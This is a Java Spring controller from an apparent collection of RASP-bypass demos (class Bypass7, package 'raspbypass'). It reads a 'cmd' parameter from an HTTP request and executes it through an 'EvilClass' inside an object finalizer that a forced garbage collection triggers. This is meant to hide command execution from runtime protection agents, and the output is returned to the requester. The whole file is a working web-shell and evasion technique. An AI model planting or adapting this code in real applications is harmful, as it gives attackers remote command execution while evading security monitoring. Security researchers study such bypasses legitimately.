package com.example.raspbypass.controller;

import com.example.raspbypass.Util.EvilClass;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.ref.WeakReference;

@Controller
@RequestMapping("/bypass7")
public class Bypass7 {
    private static String RESULT;
    private static String CMD;

    private static void ModifyStaticField(String cmd) {
        CMD = cmd;
    }

    private static class EvilGC {
        @Override
        protected void finalize() throws Throwable {
            EvilClass evilClass = new EvilClass();
            try {
                RESULT = evilClass.exec(CMD);
            } catch (Exception e) {
                e.printStackTrace();
            }
            super.finalize();
        }
    }

    @GetMapping("/")
    public void weakreference(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String cmd = request.getParameter("cmd");
        ModifyStaticField(cmd);
        EvilGC evilGC = new EvilGC();
        WeakReference<EvilGC> weakPerson = new WeakReference<EvilGC>(evilGC);
        evilGC = null;
        System.gc();
        response.getWriter().write(RESULT);
    }
}
